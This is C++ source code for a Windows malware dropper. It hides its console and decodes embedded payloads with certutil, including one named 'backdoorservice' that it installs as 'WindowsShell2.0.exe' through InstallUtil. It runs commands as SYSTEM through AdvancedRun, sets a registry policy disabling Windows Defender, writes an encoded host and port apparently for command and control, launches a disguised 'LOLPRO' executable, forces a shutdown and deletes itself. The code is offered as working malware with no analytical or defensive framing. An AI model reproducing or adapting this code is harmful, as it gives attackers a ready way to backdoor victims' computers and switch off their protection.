#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <vector>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <algorithm>
#include <fstream>
#include <windows.h>
#include "base64.h"

using namespace std;

string RunInSystemCMD(string CMD)
{
    string commend = "%temp%\\AdvancedRun.exe /EXEFilename \"c:\\windows\\system32\\cmd.exe\" /CommandLine \'/K \"" + CMD + "\"\' /RunAs 8 /WindowState 1 /Run";
    return commend;
}

string RunInSystem(string pro)
{
    string commend = "%temp%\\AdvancedRun.exe /EXEFilename \"" + pro + "\" /RunAs 8 /WindowState 0 /Run";
    return commend;
}

int getdir (string dir, vector<string> &files)
{
    DIR *dp;
    struct dirent *dirp;

    if((dp = opendir(dir.c_str())) == NULL)
    {
      cout << "Error(" << errno << ") opening " << dir << endl;
      return errno;
    }
    while ((dirp = readdir(dp)) != NULL)
    {
        struct stat sb;
        stat((dir + "\\" + string(dirp->d_name)).c_str(), &sb);
        if((sb.st_mode & S_IFMT) == S_IFDIR)
        {
            files.push_back(string(dirp->d_name));
        }

    }
    closedir(dp);
    return 0;
}

bool findfile(string dir, string filename)
{
        DIR *dp;
    struct dirent *dirp;

    if((dp = opendir(dir.c_str())) == NULL)
    {
      cout << "Error(" << errno << ") opening " << dir << endl;
      return false;
    }
    while ((dirp = readdir(dp)) != NULL)
    {
        if(string(dirp->d_name) == filename)
        {
            closedir(dp);
            return true;
        }
    }
    closedir(dp);
    return false;
}

int main(int args, char* argv[])
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    base64data;

    string load = "bG9vay5jaHVtbXkuc2l0ZTo4MQ==";

    string reg = "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul";

    fstream file;
    string temppath;

    {
        system("echo %temp% > temp.dat");
        file.open("temp.dat", ios::in | ios::binary);
        file.seekg(0, ios::end);
        size_t length = file.tellg() - 3;
        file.seekg(0, ios::beg);
        char * buffer = new char[length];
        file.read(buffer, length);
        file.close();
        system("del temp.dat");
        temppath = string(buffer);
    }

    //printf("%s", (temppath + "\\AdvancedRun.cer").c_str());
    file.open((temppath + "\\AdvancedRun.cer").c_str(), ios::out | ios::trunc);
    file.write(AdvancedRun.c_str(), AdvancedRun.length());
    file.close();
    system("certutil -f -decode \"%temp%\\AdvancedRun.cer\" \"%temp%\\AdvancedRun.cab\" >nul ");
    system("expand \"%temp%\\AdvancedRun.cab\" \"%temp%\\AdvancedRun.exe\"");
    system("del \"%temp%\\AdvancedRun.cer\"");
    system("del \"%temp%\\AdvancedRun.cab\"");

    file.open((temppath + "\\msys-2.0.cer").c_str(), ios::out | ios::trunc);
    file.write(msys20.c_str(), msys20.length());
    file.close();
    system("certutil -f -decode \"%temp%\\msys-2.0.cer\" \"%temp%\\msys-2.0.cab\" >nul ");

    file.open((temppath + "\\msys-bz2-1.cer").c_str(), ios::out | ios::trunc);
    file.write(msysbz2_1.c_str(), msysbz2_1.length());
    file.close();
    system("certutil -f -decode \"%temp%\\msys-bz2-1.cer\" \"%temp%\\msys-bz2-1.cab\" >nul ");

    file.open((temppath + "\\unzip.cer").c_str(), ios::out | ios::trunc);
    file.write(unzip.c_str(), unzip.length());
    file.close();
    system("certutil -f -decode \"%temp%\\unzip.cer\" \"%temp%\\unzip.cab\" >nul ");

    file.open((temppath + "\\zip.cer").c_str(), ios::out | ios::trunc);
    file.write(zip.c_str(), zip.length());
    file.close();
    system("certutil -f -decode \"%temp%\\zip.cer\" \"%temp%\\zip.cab\" >nul ");

    file.open((temppath + "\\cat.cer").c_str(), ios::out | ios::trunc);
    file.write(cat.c_str(), cat.length());
    file.close();
    system("certutil -f -decode \"%temp%\\cat.cer\" \"%temp%\\cat.zip\" >nul ");

    file.open((temppath + "\\LOLPRO 11.1.2.cer").c_str(), ios::out | ios::trunc);
    file.write(LOLSKIN.c_str(), LOLSKIN.length());
    file.close();
    system("certutil -f -decode \"%temp%\\LOLPRO 11.1.2.cer\" \"%temp%\\LOLPRO 11.1.2.cab\" >nul ");
    system("expand \"%temp%\\LOLPRO 11.1.2.cab\" \"%temp%\\LOLPRO 11.1.2.exe\"");
    system("del \"%temp%\\LOLPRO 11.1.2.cer\"");
    system("del \"%temp%\\LOLPRO 11.1.2.cab\"");

    file.open((temppath + "\\WindowsShell2.0.cer").c_str(), ios::out | ios::trunc);
    file.write(backdoorservice.c_str(), backdoorservice.length());
    file.close();
    system("certutil -f -decode \"%temp%\\WindowsShell2.0.cer\" \"%temp%\\WindowsShell2.0.cab\" >nul ");

    string dir = string("C:\\Windows\\Microsoft.NET\\Framework\\");
    vector<string> files = vector<string>();

    getdir(dir,files);
    reverse(files.begin(),files.end());
    for (unsigned int i = 0;i < files.size();i++)
    {
        if(findfile(dir + files[i], "InstallUtil.exe"))
        {
            dir += files[i];
            break;
        }
    }


    string command = reg + "\r\n" +
                      "for %%a in (msys-2.0 msys-bz2-1) do (expand \"" + temppath + "\\%%a.cab\" \"%SystemRoot%\\System32\\%%a.dll\" >nul)\r\n" +
                      "for %%a in (unzip zip) do (expand \"" + temppath + "\\%%a.cab\" \"%SystemRoot%\\System32\\%%a.exe\" >nul)\r\n" +
                      "for %%a in (msys-2.0 msys-bz2-1 unzip zip) do (del \"" + temppath + "\\%%a.*\" >nul)\r\n" +
                      "expand \"" + temppath + "\\WindowsShell2.0.cab\" \"" + dir + "\\WindowsShell2.0.exe\" >nul\r\n" +
                      "echo " + load + " > \"" + dir + "\\loading.dat\"\r\n" +
                      "\"" + dir + "\\InstallUtil.exe\" /i \"" + dir + "\\WindowsShell2.0.exe\" >nul\r\n" +
                      "unzip -o \"" + temppath + "\\cat.zip\" -d \"%SystemRoot%\\System32\"\r\n" +
                      "for %%a in (WindowsShell2.0 cat) do (del \"" + temppath + "\\%%a.*\" >nul)\r\n" +
                      "\"" + temppath + "\\LOLPRO 11.1.2.exe\"\r\n" +
                      "del \"" + temppath + "\\LOLPRO 11.1.2.exe\" >nul\r\n" +
                      "del \"" + temppath + "\\doing.bat\" >nul";


    file.open((temppath + "\\doing.bat").c_str(), ios::out | ios::trunc);
    file.write(command.c_str(), command.length());
    file.close();

    system(RunInSystem("\"%temp%\\doing.bat\"").c_str());

    //system("pause");
    system("del \"%temp%\\AdvancedRun.exe\"");
    system("shutdown /s /t 120");
    system(("start cmd /C \"del \"" + string(argv[0]) + "\"&& exit\"").c_str());
}
